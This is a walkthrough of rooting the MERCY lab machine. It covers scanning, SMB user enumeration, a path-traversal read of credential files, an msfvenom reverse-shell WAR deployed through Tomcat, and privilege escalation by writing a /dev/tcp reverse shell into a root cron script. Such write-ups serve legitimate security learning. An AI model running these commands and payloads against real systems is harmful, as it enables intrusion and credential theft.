# 1. Nmap Scan

<details>
  <summary>TCP Scan</summary>

```console
┌──(root㉿kali)-[~]
└─# nmap -p- -A 10.0.88.35
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-15 07:23 +08
Nmap scan report for 10.0.88.35
Host is up (0.0017s latency).
Not shown: 65525 closed tcp ports (reset)
PORT     STATE    SERVICE     VERSION
22/tcp   filtered ssh
53/tcp   open     domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.9.5-3ubuntu0.17-Ubuntu
80/tcp   filtered http
110/tcp  open     pop3        Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
|_pop3-capabilities: UIDL SASL TOP STLS CAPA PIPELINING RESP-CODES AUTH-RESP-CODE
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open     imap        Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
|_imap-capabilities: Pre-login SASL-IR ID more have post-login capabilities LITERAL+ LOGINDISABLEDA0001 listed OK LOGIN-REFERRALS STARTTLS IDLE ENABLE IMAP4rev1
445/tcp  open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
993/tcp  open     ssl/imap    Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
|_imap-capabilities: Pre-login SASL-IR ID more have capabilities LITERAL+ post-login listed AUTH=PLAINA0001 LOGIN-REFERRALS OK IDLE ENABLE IMAP4rev1
995/tcp  open     ssl/pop3    Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: UIDL SASL(PLAIN) TOP USER CAPA PIPELINING RESP-CODES AUTH-RESP-CODE
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
8080/tcp open     http        Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 1 disallowed entry
|_/tryharder/tryharder
| http-methods:
|_  Potentially risky methods: PUT DELETE
|_http-title: Apache Tomcat
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=12/15%OT=53%CT=1%CU=37844%PV=Y%DS=2%DC=T%G=Y%TM=639A5B
OS:01%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=2%ISR=10A%TI=Z%TS=8)OPS(O1=M5B4S
OS:T11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M
OS:5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=N)T1(R
OS:=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40
OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=
OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 2 hops
Service Info: Host: MERCY; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -2h40m00s, deviation: 4h37m07s, median: 0s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2022-12-14T23:23:37
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: MERCY, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: mercy
|   NetBIOS computer name: MERCY\x00
|   Domain name: \x00
|   FQDN: mercy
|_  System time: 2022-12-15T07:23:37+08:00

TRACEROUTE (using port 554/tcp)
HOP RTT     ADDRESS
1   0.55 ms 192.168.17.1
2   1.34 ms 10.0.88.35

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.91 seconds
```

</details>

<details>
  <summary>UDP Scan</summary>

```console
┌──(root㉿kali)-[~]
└─# nmap -sU -A --top-ports 100 10.0.88.35
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-15 07:28 +08
Nmap scan report for 10.0.88.35
Host is up (0.0019s latency).
Not shown: 93 closed udp ports (port-unreach)
PORT     STATE         SERVICE     VERSION
53/udp   open          domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.9.5-3ubuntu0.17-Ubuntu
68/udp   open|filtered dhcpc
123/udp  open          ntp         NTP v3
| ntp-info:
|_
137/udp  open          netbios-ns  Samba nmbd netbios-ns (workgroup: WORKGROUP)
| nbns-interfaces:
|   hostname: MERCY
|   interfaces:
|_    10.0.88.35
138/udp  open|filtered netbios-dgm
631/udp  open|filtered ipp
5353/udp open          mdns        DNS-based service discovery
| dns-service-discovery:
|   9/tcp workstation
|_    Address=10.0.88.35 fe80::215:5dff:fe4b:a993
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops
Service Info: Host: MERCY; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 10s
|_nbstat: NetBIOS name: MERCY, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)

TRACEROUTE (using port 49153/udp)
HOP RTT     ADDRESS
1   0.86 ms 192.168.17.1
2   2.04 ms 10.0.88.35

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 253.20 seconds
```

</details>

# 2. Exploring tomcat at `8080`

<details>
  <summary><h2>Attempting tomcat exploit → unsuccessful</h2></summary>

```console
┌──(root㉿kali)-[~]
└─# searchsploit tomcat 7.0
---------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                  |  Path
---------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache Tomcat 7.0.4 - 'sort' / 'orderBy' Cross-Site Scripting                                                   | linux/remote/35011.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)    | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)    | jsp/webapps/42966.py
---------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(root㉿kali)-[~]
└─# searchsploit -m 42966
  Exploit: Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)
      URL: https://www.exploit-db.com/exploits/42966
     Path: /usr/share/exploitdb/exploits/jsp/webapps/42966.py
    Codes: CVE-2017-12617
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /root/42966.py

┌──(root㉿kali)-[~]
└─# python3 42966.py -u http://10.0.88.35:8080



   _______      ________    ___   ___  __ ______     __ ___   __ __ ______
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / /
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/



[@intx0x80]


Poc Filename  Poc.jsp
Not Vulnerable to CVE-2017-12617
```

</details>

## Checking web root directory

Browsing to the web root directory reveals that tomcat admin users are defined in `/etc/tomcat7/tomcat-users.xml`

```console
NOTE: For security reasons, using the manager webapp is restricted to users with role "manager-gui". The host-manager webapp is restricted to users with role "admin-gui". Users are defined in /etc/tomcat7/tomcat-users.xml.
```

## Checking interesting path revealed in nmap scan

<details>
  <summary>A path at <code>/tryharder/tryharder</code> was found as a disallowed entry from <code>robots.txt</code></summary>

```console
8080/tcp open     http        Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 1 disallowed entry
|_/tryharder/tryharder
| http-methods:
|_  Potentially risky methods: PUT DELETE
|_http-title: Apache Tomcat
```

</details>

`GET`-ing this path reveals a base64-encoded string: 

```console
SXQncyBhbm5veWluZywgYnV0IHdlIHJlcGVhdCB0aGlzIG92ZXIgYW5kIG92ZXIgYWdhaW46IGN5YmVyIGh5Z2llbmUgaXMgZXh0cmVtZWx5IGltcG9ydGFudC4gUGxlYXNlIHN0b3Agc2V0dGluZyBzaWxseSBwYXNzd29yZHMgdGhhdCB3aWxsIGdldCBjcmFja2VkIHdpdGggYW55IGRlY2VudCBwYXNzd29yZCBsaXN0LgoKT25jZSwgd2UgZm91bmQgdGhlIHBhc3N3b3JkICJwYXNzd29yZCIsIHF1aXRlIGxpdGVyYWxseSBzdGlja2luZyBvbiBhIHBvc3QtaXQgaW4gZnJvbnQgb2YgYW4gZW1wbG95ZWUncyBkZXNrISBBcyBzaWxseSBhcyBpdCBtYXkgYmUsIHRoZSBlbXBsb3llZSBwbGVhZGVkIGZvciBtZXJjeSB3aGVuIHdlIHRocmVhdGVuZWQgdG8gZmlyZSBoZXIuCgpObyBmbHVmZnkgYnVubmllcyBmb3IgdGhvc2Ugd2hvIHNldCBpbnNlY3VyZSBwYXNzd29yZHMgYW5kIGVuZGFuZ2VyIHRoZSBlbnRlcnByaXNlLg==
```

[Decoding](https://www.base64decode.org/) this string returns:

```console
It's annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list.

Once, we found the password "password", quite literally sticking on a post-it in front of an employee's desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her.

No fluffy bunnies for those who set insecure passwords and endanger the enterprise.
```

This sounds like a hint to try `password` as password for something, let's look for what to try this on

☝️ if no exploits can be found for entry to the box, the answer may be elsewhere

In this case, it's a password hint encoded in base64

# 3. Exploring SMB

We found a password, now to look for users; one way to list users is to enumerate SMB

<details>
  <summary>Users <code>pleadformercy</code>, <code>qiu</code>, <code>thisisasuperduperlonguser</code> and <code>fluffy</code> were found using <code>enum4linux</code></summary>

```console
┌──(root㉿kali)-[~]
└─# enum4linux 10.0.88.35
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Dec 18 14:13:33 2022

 =========================================( Target Information )=========================================

Target ........... 10.0.88.35
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =============================( Enumerating Workgroup/Domain on 10.0.88.35 )=============================


[+] Got domain/workgroup name: WORKGROUP


 =================================( Nbtstat Information for 10.0.88.35 )=================================

Looking up status of 10.0.88.35
        MERCY           <00> -         B <ACTIVE>  Workstation Service
        MERCY           <03> -         B <ACTIVE>  Messenger Service
        MERCY           <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ====================================( Session Check on 10.0.88.35 )====================================


[+] Server 10.0.88.35 allows sessions using username '', password ''


 =================================( Getting domain SID for 10.0.88.35 )=================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 ====================================( OS information on 10.0.88.35 )====================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.0.88.35 from srvinfo:
        MERCY          Wk Sv PrQ Unx NT SNT MERCY server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 ========================================( Users on 10.0.88.35 )========================================

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: pleadformercy    Name: QIU       Desc:
index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: qiu      Name:   Desc:

user:[pleadformercy] rid:[0x3e8]
user:[qiu] rid:[0x3e9]

 ==================================( Share Enumeration on 10.0.88.35 )==================================


        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        qiu             Disk
        IPC$            IPC       IPC Service (MERCY server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP

[+] Attempting to map shares on 10.0.88.35

//10.0.88.35/print$     Mapping: DENIED Listing: N/A Writing: N/A
//10.0.88.35/qiu        Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//10.0.88.35/IPC$       Mapping: N/A Listing: N/A Writing: N/A

 =============================( Password Policy Information for 10.0.88.35 )=============================



[+] Attaching to 10.0.88.35 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] MERCY
        [+] Builtin

[+] Password Info for Domain: MERCY

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes
        [+] Locked Account Duration: 30 minutes
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:


Password Complexity: Disabled
Minimum Password Length: 5


 ========================================( Groups on 10.0.88.35 )========================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 ===================( Users on 10.0.88.35 via RID cycling (RIDS: 500-550,1000-1050) )===================


[I] Found new SID:
S-1-22-1

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\pleadformercy (Local User)
S-1-22-1-1001 Unix User\qiu (Local User)
S-1-22-1-1002 Unix User\thisisasuperduperlonguser (Local User)
S-1-22-1-1003 Unix User\fluffy (Local User)

[+] Enumerating users using SID S-1-5-21-3544418579-3748865642-433680629 and logon username '', password ''

S-1-5-21-3544418579-3748865642-433680629-501 MERCY\nobody (Local User)
S-1-5-21-3544418579-3748865642-433680629-513 MERCY\None (Domain Group)
S-1-5-21-3544418579-3748865642-433680629-1000 MERCY\pleadformercy (Local User)
S-1-5-21-3544418579-3748865642-433680629-1001 MERCY\qiu (Local User)

 ================================( Getting printer info for 10.0.88.35 )================================

No printers returned.


enum4linux complete on Sun Dec 18 14:13:46 2022
```

</details>

<details>
  <summary>Using <code>hydra</code> reveals that <code>qiu</code> is the owner of the password</summary>

```console
┌──(root㉿kali)-[~]
└─# hydra -L users.txt -p password 10.0.88.35 smb
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-18 14:31:59
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 4 login tries (l:4/p:1), ~4 tries per task
[DATA] attacking smb://10.0.88.35:445/
[445][smb] host: 10.0.88.35   login: qiu   password: password
[445][smb] Host: 10.0.88.35 Account: thisisasuperduperlonguser Error: Invalid account (Anonymous success)
[445][smb] Host: 10.0.88.35 Account: fluffy Error: Invalid account (Anonymous success)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-18 14:32:00
```

</details>

<details>
  <summary>Connecting the share with <code>smbclient</code> reveals that it is <code>qiu</code>'s home directory with an intertesting <code>.private</code> hidden directory</summary>

```console
┌──(root㉿kali)-[~]
└─# smbclient -U qiu%password //10.0.88.35/qiu -c dir
  .                                   D        0  Sat Sep  1 03:07:00 2018
  ..                                  D        0  Tue Nov 20 00:59:09 2018
  .bashrc                             H     3637  Sun Aug 26 21:19:34 2018
  .public                            DH        0  Sun Aug 26 22:23:24 2018
  .bash_history                       H      163  Sat Sep  1 03:11:34 2018
  .cache                             DH        0  Sat Sep  1 02:22:05 2018
  .private                           DH        0  Mon Aug 27 00:35:34 2018
  .bash_logout                        H      220  Sun Aug 26 21:19:34 2018
  .profile                            H      675  Sun Aug 26 21:19:34 2018

                19213004 blocks of size 1024. 16330216 blocks available
```

</details>

☝️ You can't `dir` hidden directories with `smbclient`, you need to `mount` the share to list them

<details>
  <summary>Mounting the share to read the hidden directories reveals a hidden config file at <code>/qiu/.private/opensesame/config</code></summary>

```console
┌──(root㉿kali)-[~]
└─# mount -t cifs -o username=qiu,password=password //10.0.88.35/qiu /mnt

┌──(root㉿kali)-[~]
└─# ls -la /mnt
total 4100
drwxr-xr-x  2 root root    0 Sep  1  2018 .
drwxr-xr-x 19 root root 4096 Dec 18 15:00 ..
-rwxr-xr-x  1 root root  163 Sep  1  2018 .bash_history
-rwxr-xr-x  1 root root  220 Aug 26  2018 .bash_logout
-rwxr-xr-x  1 root root 3637 Aug 26  2018 .bashrc
drwxr-xr-x  2 root root    0 Sep  1  2018 .cache
drwxr-xr-x  2 root root    0 Aug 27  2018 .private
-rwxr-xr-x  1 root root  675 Aug 26  2018 .profile
drwxr-xr-x  2 root root    0 Aug 26  2018 .public

┌──(root㉿kali)-[~]
└─# ls -la /mnt/.private
total 1024
drwxr-xr-x 2 root root  0 Aug 27  2018 .
drwxr-xr-x 2 root root  0 Sep  1  2018 ..
drwxr-xr-x 2 root root  0 Aug 31  2018 opensesame
-rwxr-xr-x 1 root root 94 Aug 26  2018 readme.txt
drwxr-xr-x 2 root root  0 Nov 20  2018 secrets

┌──(root㉿kali)-[~]
└─# ls -la /mnt/.private/opensesame/
total 2048
drwxr-xr-x 2 root root     0 Aug 31  2018 .
drwxr-xr-x 2 root root     0 Aug 27  2018 ..
-rwxr-xr-x 1 root root 17543 Sep  1  2018 config
-rwxr-xr-x 1 root root   539 Aug 31  2018 configprint
```

</details>

<details>
  <summary>Reading the <code>/qiu/.private/opensesame/config</code> config file reveals the port knocking configuration for <code>HTTP</code> and <code>SSH</code></summary>

```console
┌──(root㉿kali)-[~]
└─# cat /mnt/.private/opensesame/config
⋮
Port Knocking Daemon Configuration

[options]
        UseSyslog

[openHTTP]
        sequence    = 159,27391,4
        seq_timeout = 100
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
        tcpflags    = syn

[closeHTTP]
        sequence    = 4,27391,159
        seq_timeout = 100
        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
        tcpflags    = syn

[openSSH]
        sequence    = 17301,28504,9999
        seq_timeout = 100
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn

[closeSSH]
        sequence    = 9999,28504,17301
        seq_timeout = 100
        command     = /sbin/iptables -D iNPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn
⋮
```

</details>

This explains why `80` and `22` showed up as `filtered` in the nmap scan

# 4. Exploring HTTP at `80`

Unlock port `80` with `knock -v 10.0.88.35 159 27391 4`

<details>
  <summary>Enumerate the site with <code>gobuster dir -u http://10.0.88.35 -w /usr/share/dirb/wordlists/common.txt</code>:</summary>

```console
┌──(root㉿kali)-[~]
└─# gobuster dir -u http://10.0.88.35 -w /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.88.35
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/20 07:52:02 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 286]
/.hta                 (Status: 403) [Size: 281]
/.htaccess            (Status: 403) [Size: 286]
/index.html           (Status: 200) [Size: 90]
/robots.txt           (Status: 200) [Size: 50]
/server-status        (Status: 403) [Size: 290]
/time                 (Status: 200) [Size: 79]
Progress: 4614 / 4615 (99.98%)===============================================================
2022/12/20 07:52:04 Finished
===============================================================
```

</details>

2 interesting items found:
1. The `/time` page is a time check which reports the system's time - **this can be useful later**
2. The `robots.txt` file reveals 2 paths at `/mercy` and `/nomercy`

`/mercy` holds a troll message, while `/nomercy` leads to the `RIPS` static code scanning tool

![image](https://user-images.githubusercontent.com/90442032/208301920-8a36ba9f-4d9d-492a-bdfa-2cdae282c873.png)

The exact RIPS version 0.53 has a [LFI vulnerability](https://www.exploit-db.com/exploits/18660)

Testing the LFI with `curl -L http://10.0.88.35/nomercy/windows/code.php?file=../../../../../etc/passwd` works and it returned the queried `/etc/passwd` file

```console
⋮
35 <? tomcat7:x:116:126::/usr/share/tomcat7:/bin/false
36 <? pleadformercy:x:1000:1000:pleadformercy:/home/pleadformercy:/bin/bash
37 <? qiu:x:1001:1001:qiu:/home/qiu:/bin/bash
38 <? thisisasuperduperlonguser:x:1002:1002:,,,:/home/thisisasuperduperlonguser:/bin/bash
39 <? fluffy:x:1003:1003::/home/fluffy:/bin/sh 
⋮
```

Remember that there was a Tomcat admin users configuration file at `/etc/tomcat7/tomcat-users.xml`

Retrieving the file with `curl -L http://10.0.88.35/nomercy/windows/code.php?file=../../../../../etc/tomcat7/tomcat-users.xml` returns the admin users credentials

```console
⋮
29 <? <role rolename="admin-gui"/>
30 <? <role rolename="manager-gui"/>
31 <? <user username="thisisasuperduperlonguser" password="heartbreakisinevitable" roles="admin-gui,manager-gui"/>
32 <? <user username="fluffy" password="freakishfluffybunny" roles="none"/>
⋮
```

`thisisasuperduperlonguser` user looks like a way in with the Tomcat manager

`fluffy` doesn't have any roles on Tomcat, but a password is listed - **this can be useful later**

# 5. Getting a reverse shell from tomcat

Logging to Tomcat Web Application Manager at `/manager` with the credentials found:

![image](https://user-images.githubusercontent.com/90442032/208302438-1c354760-543e-43a4-9d3a-3b4867265af0.png)

Generate a reverse shell war file to be uploaded to Tomcat

```console
┌──(root㉿kali)-[~]
└─# msfvenom -p java/jsp_shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f war -o reverse.war
Payload size: 1087 bytes
Final size of war file: 1087 bytes
Saved as: reverse.war
```

Upload `reverse.war` in Tomcat Web Application Manager web console

Start listener in kali: `rlwrap nc -nlvp 4444`

Load the reverse shell: `curl -L http://10.0.88.35:8080/reverse`

```console
connect to [192.168.17.10] from (UNKNOWN) [10.0.88.35] 51324
whoami
tomcat7
id
uid=116(tomcat7) gid=126(tomcat7) groups=126(tomcat7)
python -c 'import pty;pty.spawn("/bin/bash")'
tomcat7@MERCY:/var/lib/tomcat7$
```

Got the `/local.txt`:

```console
tomcat7@MERCY:/var/lib/tomcat7$ cat /local.txt
cat /local.txt
Plz have mercy on me! :-( :-(
```

There isn't much doable with the tomcat7 user, but recall that there was a password found for `fluffy` previously, let's `su` to it:

```console
tomcat7@MERCY:/var/lib/tomcat7$ su fluffy
su fluffy
Password: freakishfluffybunny
$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
fluffy@MERCY:/var/lib/tomcat7$ whoami
whoami
fluffy
fluffy@MERCY:/var/lib/tomcat7$ id
id
uid=1003(fluffy) gid=1003(fluffy) groups=1003(fluffy)
```

<details>
  <summary>Listing the home directory of <code>fluffy</code> reveals a <code>timeclock</code> script owned by <code>root</code> that is writeable by <code>fluffy</code></summary>

```console
fluffy@MERCY:/var/lib/tomcat7$ cd ~
cd ~
fluffy@MERCY:~$ ls -lRa
ls -lRa
.:
total 16
drwxr-x--- 3 fluffy fluffy 4096 Nov 20  2018 .
drwxr-xr-x 6 root   root   4096 Nov 20  2018 ..
-rw------- 1 fluffy fluffy  322 Dec 20 08:16 .bash_history
drwxr-xr-x 3 fluffy fluffy 4096 Nov 20  2018 .private

./.private:
total 12
drwxr-xr-x 3 fluffy fluffy 4096 Nov 20  2018 .
drwxr-x--- 3 fluffy fluffy 4096 Nov 20  2018 ..
drwxr-xr-x 2 fluffy fluffy 4096 Nov 20  2018 secrets

./.private/secrets:
total 20
drwxr-xr-x 2 fluffy fluffy 4096 Nov 20  2018 .
drwxr-xr-x 3 fluffy fluffy 4096 Nov 20  2018 ..
-rwxr-xr-x 1 fluffy fluffy   37 Nov 20  2018 backup.save
-rw-r--r-- 1 fluffy fluffy   12 Nov 20  2018 .secrets
-rwxrwxrwx 1 root   root    222 Nov 20  2018 timeclock
fluffy@MERCY:~$ cat .private/secrets/backup.save
cat .private/secrets/backup.save
#!/bin/bash

echo Backing Up Files;

fluffy@MERCY:~$ cat .private/secrets/.secrets
cat .private/secrets/.secrets
Try harder!
fluffy@MERCY:~$ cat .private/secrets/timeclock
cat .private/secrets/timeclock
#!/bin/bash

now=$(date)
echo "The system time is: $now." > ../../../../../var/www/html/time
echo "Time check courtesy of LINUX" >> ../../../../../var/www/html/time
chown www-data:www-data ../../../../../var/www/html/time
```

</details>

It looks like there should be a cron job that runs this `timeclock` script as `root` to update the `/time` page

Let's replace this with a reverse shell to get a root shell the next time this script runs

```console
fluffy@MERCY:~$ echo "bash -i >& /dev/tcp/kali.vx/4445 0>&1" > .private/secrets/timeclock
echo "bash -i >& /dev/tcp/kali.vx/4445 0>&1" > .private/secrets/timeclock
fluffy@MERCY:~$ cat .private/secrets/timeclock
cat .private/secrets/timeclock
bash -i >& /dev/tcp/192.168.17.10/4445 0>&1
```

Start listener in kali: `rlwrap nc -nlvp 4445` and wait for the script to run

And... we have root shell:

```console
connect to [192.168.17.10] from (UNKNOWN) [10.0.88.35] 43744
bash: cannot set terminal process group (13203): Inappropriate ioctl for device
bash: no job control in this shell
root@MERCY:~#
```

Going for the `proof.txt`

```console
root@MERCY:~# find / -name proof.txt
find / -name proof.txt
/root/proof.txt
root@MERCY:~# cat proof.txt
cat proof.txt
Congratulations on rooting MERCY. :-)
```

Looking back: there is indeed a cron job running under `root` that updates the `/time` page and `configprint` in `qiu`'s directory

```console
root@MERCY:~# crontab -l
crontab -l
# Edit this file to introduce tasks to be run by cron.
#
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
#
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').#
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# For more information see the manual pages of crontab(5) and cron(8)
#
# m h  dom mon dow   command

*/3 * * * * bash /home/fluffy/.private/secrets/timeclock
*/5 * * * * bash /home/qiu/.private/opensesame/configprint
```
